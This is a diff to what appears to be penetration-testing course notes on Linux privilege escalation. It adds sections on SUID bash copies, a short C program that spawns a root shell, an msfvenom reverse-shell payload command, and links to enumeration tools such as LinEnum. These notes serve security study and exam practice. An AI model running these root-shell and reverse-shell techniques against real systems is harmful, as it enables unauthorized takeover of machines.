@@ -48,12 +48,16 @@ Hacking linux
   - [Viewing Permissions](#Viewing-Permissions)
   - [Real and Effective and Saved UID and GID](#Real-and-Effective-and-Saved-UID-and-GID)
   - [Spawning Root Shells](#Spawning-Root-Shells)
-  - [](#)
-  - [](#)
-  - [](#)
-  - [](#)
-  - [](#)
-  - [](#)
+  - [rootbash SUID](#rootbash-SUID)
+  - [Custom Executable](#Custom-Executable)
+  - [Native Reverse Shells](#Native-Reverse-Shells)
+- [Privilege Escalation Tools](#Privilege-Escalation-Tools)
+  - [Why use tools?](#Why-use-tools?)
+  - [Linux Smart Enumeration](#Linux-Smart-Enumeration)
+  - [LinEnum](#LinEnum)
+  - [Other Tools](#Other-Tools)
+- [Kernel Exploits](#Kernel-Exploits)
+-------------------------------------------------------------------------------------------------------------------------------------------------------
 - [Linux Privilige Escalation 1](#Linux-Privilige-Escalation-1)
   - [Automated Enumeration Tools](#Automated-Enumeration-Tools)
   - [Enumeration](#Enumeration)
@@ -526,7 +530,7 @@ When focusing on privilege escalations in Linux,
 understanding how Linux handles permissions is very
 important.
 
-### Understanding Permissions in Linux
+## Understanding Permissions in Linux
 
 #### Users Groups and Files and Directories
 At a basic level, permissions in Linux are a relationship between
@@ -636,7 +640,91 @@ Uid: 1000 0 0 0
 Gid: 1000 0 0 0
 ```
 
-### Spawning Root Shells
+## Spawning Root Shells
+
+As stated in the introduction to this course, our ultimate goal is to
+spawn a root shell.
+While the end result is the same (executing /bin/sh or /bin/bash),
+there are multiple ways of achieving this execution.
+In this course, we will use a variety of methods. This section
+highlights a few which can be used in situations where commands
+can be executed as root.
+
+### rootbash SUID
+One of my favorite ways to spawn a root shell is to create a copy
+of the /bin/bash executable file (I usually rename it rootbash),
+make sure it is owned by the root user, and has the SUID bit set.
+A root shell can be spawned by simply executing the rootbash file
+with the -p command line option.
+The benefit of this method is it is persistent (once you run the
+exploit, rootbash can be used multiple times).
+
+### Custom Executable
+There may be instances where some root process executes another
+process which you can control. In these cases, the following C code,
+once compiled, will spawn a Bash shell running as root:
+
+```
+int main() {
+setuid(0);
+system("/bin/bash -p");
+}
+```
+Compile using:
+```
+$ gcc -o <name> <filename.c>
+```
+
+msfvenom
+Alternatively, if a reverse shell is preferred, msfvenom
+can be used to generate an executable (.elf) file:
+```
+$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+```
+This reverse shell can be caught using netcat or
+Metasploit’s own multi/handler.
+
+### Native Reverse Shells
+There are multiple ways to spawn reverse shells natively
+on many Linux distributions.
+A good tool for suggesting these is:
+https://github.com/mthbernardes/rsg
+All can be caught using a simple netcat listener.
+
+## Privilege Escalation Tools
+
+#### Why use tools?
+Tools allow us to automate the reconnaissance that can identify
+potential privilege escalations.
+While it is always important to understand what tools are doing,
+they are invaluable in a time-limited setting, such as an exam.
+In this course we will use Linux Smart Enumeration and LinEnum.
+
+### Linux Smart Enumeration
+Linux Smart Enumeration (lse.sh) has recently become my
+personal favorite privilege escalation tool.
+In addition to being a Bash script (which helps if Python isn’t
+installed), it has multiple levels which gradually reveal more
+and more information.
+https://github.com/diego-treitos/linux-smart-enumeration
+
+### LinEnum
+LinEnum is an advanced Bash script which extracts a large
+amount of useful information from the target system.
+It can copy interesting files for export, and search for files
+containing a keyword (e.g. “password”).
+```
+https://github.com/rebootuser/LinEnum
+```
+
+### Other Tools
+While we won’t use these tools in the course, feel free to
+experiment with them:
+• https://github.com/linted/linuxprivchecker
+• https://github.com/AlessandroZ/BeRoot
+• http://pentestmonkey.net/tools/audit/unix-privesc-check
+
+## Kernel Exploits
 ---------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## Linux Privilige Escalation 1
